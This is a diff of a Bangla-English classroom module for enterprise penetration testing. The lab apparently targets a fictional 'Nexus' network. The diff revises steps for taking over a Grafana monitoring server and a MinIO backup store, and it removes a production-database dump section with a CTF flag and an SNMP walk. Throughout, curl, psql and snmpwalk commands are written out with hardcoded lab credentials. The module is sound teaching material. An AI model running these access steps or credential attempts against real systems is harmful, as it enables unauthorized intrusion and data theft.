@@ -1,4 +1,4 @@
-# 🏢 Enterprise Network Penetration Testing — Class Module 02
+﻿# 🏢 Enterprise Network Penetration Testing — Class Module 02
 ### *"From Zero Knowledge to Full Compromise — Black-box to Gray-box"*
 
 > **Instructor:** [তোমার নাম]
@@ -904,136 +904,84 @@ Real-world impact যদি এটা actual pentest হতো:
 
 ---
 
-### 💎 Gray-box Exclusive #4 — Grafana: Monitoring System Takeover
+### [GEM] Gray-box Exclusive #4 -- Grafana: Monitoring System Takeover
 
+**bolo:**
+> *"Grafana holo monitoring dashboard -- kon server kotTuku CPU/RAM use korche, network traffic kemon -- sob ekhane dekha jay. INFRA_RUNBOOK.txt te dekhechilamm 10.0.2.21 te ache. Ar nmap e port 3000 open chilo -- eta publicly accessible!"*
 
-**বলো:**
-> *"প্রতিটা enterprise এ একটা monitoring system থাকে — network কেমন চলছে, কোন server এ কতটুকু load, সব দেখার জন্য। Nexus এ Grafana আছে। Black-box এ এই service টা দেখাই যাচ্ছিল না — কারণ এটা internal network এ। Gray-box এ আমরা জানি এটা 10.0.2.21 তে আছে।"*
-
-**Step 1 — Bastion থেকে Grafana reach করো:**
+**Step 1 -- Confirm koro:**
 ```bash
-# Bastion এ আছি — internal Grafana accessible:
 curl -I http://10.0.2.21:3000
-# Response: 200 OK → Grafana চলছে
+# HTTP/1.1 200 OK
+
+curl -s http://10.0.2.21:3000/api/health
+# {"database":"ok","version":"13.2.0",...}
 
 # Anonymous access check:
-curl http://10.0.2.21:3000/api/org
-# Response: {"id":1,"name":"Main Org."} → Anonymous read access আছে!
+curl -s http://10.0.2.21:3000/api/org
+# {"id":1,"name":"Main Org."} -> Anonymous access enabled!
+
+# Basic auth diye admin access:
+curl -s -u 'nexus_nms_admin:NMS@Nexus2026!' http://10.0.2.21:3000/api/org/users
+# Returns user list -> Admin confirmed!
 ```
 
-**Step 2 — Default credentials try করো:**
-```bash
-# Default Grafana creds try:
-curl -X POST http://10.0.2.21:3000/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"user":"admin","password":"admin"}'
-
-# Nexus custom creds try:
-curl -X POST http://10.0.2.21:3000/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"user":"nexus_nms_admin","password":"NMS@Nexus2026!"}'
-# ✅ Login successful!
+**Step 2 -- Browser e dekhaow:**
+```
+# Port 3000 publicly accessible -- sorashori browser e:
+http://<VPS_IP>:3000
+-> Sign in: nexus_nms_admin / NMS@Nexus2026!
 ```
 
-**Step 3 — Browser এ দেখাও (WOW moment):**
+**Real Findings:**
 ```
-# SSH tunnel করো (local machine থেকে দেখার জন্য):
-ssh -L 3000:10.0.2.21:3000 devops-remote@<VPS_IP> -p 2222
-
-# তারপর browser এ:
-http://localhost:3000
-→ Login: nexus_nms_admin / NMS@Nexus2026!
-```
-
-**Browser এ দেখাও:**
-```
-Grafana Dashboard:
-  → All network nodes live metrics
-  → CPU/RAM/Network usage — সব server এর
-  → Internal IP mapping — কোন IP তে কী আছে
-  → Alert rules — কোন threshold set আছে
-  → Data sources → Prometheus config → internal endpoints
+[check] Port 3000: publicly accessible (nmap e dekha giyechilo)
+[check] Anonymous access enabled -> org info leak (black-box finding!)
+[check] Version 13.2.0 -> check known CVEs
+[check] nexus_nms_admin / NMS@Nexus2026! -> Admin role
+[check] Administration panel: Users, Connections, Plugins
+[x] Data sources: empty (configured nei)
+[x] Dashboards: none
 ```
 
-**বলো:**
-> *"দেখো — monitoring system এ ঢুকে গেছি। এখানে পুরো network এর map আছে। কোন server কোথায়, কীভাবে connected — সব। Black-box এ এই service টার existence ও জানতাম না। Gray-box এ directly এলাম।*
+**bolo:**
+> *"Monitoring system e admin access peyechi. Data sources empty -- kintu admin hisebe amra nijei production PostgreSQL add korte partam ebong Grafana theke DB query korte partam. ETA arekta attack path.*
 >
-> *Real world এ এই ধরনের monitoring tool এ default credentials রেখে দেওয়া অনেক common। আর এই access দিয়ে attacker internal infrastructure এর পুরো picture পেয়ে যায়।"*
-
-**💡 Bonus — SNMP (Port 161):**
-```bash
-# Black-box scan এ port 161 UDP দেখা গিয়েছিল
-# Community string "public" try করো:
-snmpwalk -v2c -c public <VPS_IP>
-# Network device info, routing table, interface list dump হবে
-# এটাও একটা information leak — device vendor, OS version সব বের হয়
-```
+> *Important: port 3000 black-box e nmap eo dekha giyechilo. Tai anonymous access ebong version disclosure black-box finding o -- gray-box e shudhu admin credentials peyechi."*
 
 **MITRE ATT&CK:**
-> `T1078.001 — Valid Accounts: Default Accounts`
-> `T1518 — Software Discovery (Monitoring Tools)`
-> `T1082 — System Information Discovery`
+> `T1078.001 -- Valid Accounts: Default Accounts`
+> `T1518 -- Software Discovery`
 
----
 
-### 🏆 Gray-box Exclusive #4 — Crown Jewels: Production Database
 
-**বলো:**
-> *"এটাই সবচেয়ে important। Production database — company র সব critical data। Black-box এ port 5432 দেখা গিয়েছিল কিন্তু সেটা monitoring_db (limited)। Production DB আছে internal network এ — 10.0.3.20 — বাইরে থেকে accessible না। SMB share থেকে password পেয়েছি — এখন সরাসরি যাবো।"*
+### [GEM] Gray-box Exclusive #5 -- MinIO Backup Storage
 
-```bash
-# Bastion থেকে production DB তে:
-# SMB share script থেকে পাওয়া credential ব্যবহার করো
-psql -h 10.0.3.20 -U nexus_admin -d nexus_prod
-Password: Nexu$$Prod2026!Sec
+**bolo:**
+> *"MinIO holo S3-compatible object storage -- AWS S3 er moto kintu self-hosted. Nexus ekhane DB backup rakhe. sync_prod_db.sh script e credentials peyechilam."*
 
--- Tables দেখো:
-\dt
-
--- Employee data:
-SELECT id, name, email, department FROM employees LIMIT 10;
-
--- 🏆 Crown Jewels:
-SELECT * FROM system_vault_keys;
--- FLAG{CR0WN_J3W3LS_DC_D4T4B4S3_C0MPR0M1S3D_2026!}
-
--- Salary records:
-SELECT * FROM salary_records LIMIT 5;
+**Browser e login koro:**
 ```
-
-**WOW Moment — বলো:**
-> *"এই data real company থেকে বের হলে — GDPR violation, regulatory fine, reputation damage। CVSS 9.8 — Critical।*
->
-> *Hacker হলে এই পর্যন্ত আসতে কতদিন লাগতো? Days, weeks। আমরা gray-box এ কত মিনিটে আসলাম?"*
-
-**MITRE ATT&CK:**
-> `T1005 — Data from Local System`
-> `T1213 — Data from Information Repositories`
-
----
-
-### 💎 Gray-box Exclusive #5 — MinIO Backup Storage
-
-**বলো:**
-> *"MinIO হলো S3-compatible object storage। কোম্পানি এখানে database backup, config files রাখে। Port 9001 black-box এ দেখা গেছে কিন্তু credential ছাড়া ঢোকা যায়নি।"*
-
-```
-Browser: http://<VPS_IP>:9001
+http://<VPS_IP>:9001
 Username: nexus_san_root
 Password: SuperS3cUr3_B4ckup_Vault_Pass_2026!
-
-→ Buckets দেখো
-→ Database backup files আছে কি?
-→ Config files download করো
 ```
 
-**বলো:**
-> *"Backup storage এ production database এর full backup আছে — মানে attacker credential জানলেই সব data download করে নিতে পারে। Black-box এ এই password পাওয়া অনেক কঠিন ছিল।"*
+**Real Findings:**
+```
+[check] Full Admin access confirmed
+[check] Administrator panel: Buckets, Policies, Identity, Monitoring
+[x] Buckets: empty (nightly backup script ekhono run hoyni)
+```
+
+**bolo:**
+> *"Admin access peyechi. Bucket ekhon empty -- kintu nightly backup script challei production DB er full SQL dump ekhane ashbe. Seta download korle puro database offline e neowa jabe.*
+>
+> *Ei credentials sync_prod_db.sh theke peyechi -- ekai password dui jagaye kaj korche. Credential reuse vulnerability."*
 
 **MITRE ATT&CK:**
-> `T1530 — Data from Cloud Storage Object`
-
----
+> `T1530 -- Data from Cloud Storage`
+> `T1552.001 -- Credentials in Files`
 
 # 🛠️ PHASE 6 — Classwork / CTF (30 min)
 ## *Students এর নিজের practice — আলাদা IP দিয়ে*
